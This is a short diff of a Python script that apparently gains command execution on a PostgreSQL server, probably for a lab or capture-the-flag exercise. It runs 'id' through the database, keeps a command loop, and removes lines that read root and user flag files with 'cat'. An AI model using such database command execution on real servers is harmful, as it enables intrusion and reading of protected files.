@@ -88,11 +88,7 @@ if __name__ == "__main__":
     try:
         try:
             id_cmd = psql_exec(cur, "id")
-            root_flag = psql_exec(cur, "cat /root/proof.txt")
-            user_flag = psql_exec(cur, "cat /home/thesplodge/local.txt")
             print(id_cmd)
-            print(f"User Flag: {user_flag}")
-            print(f"Root Flag: {root_flag}")
         except:
             print("Command execution does not seem to work")
         while True:
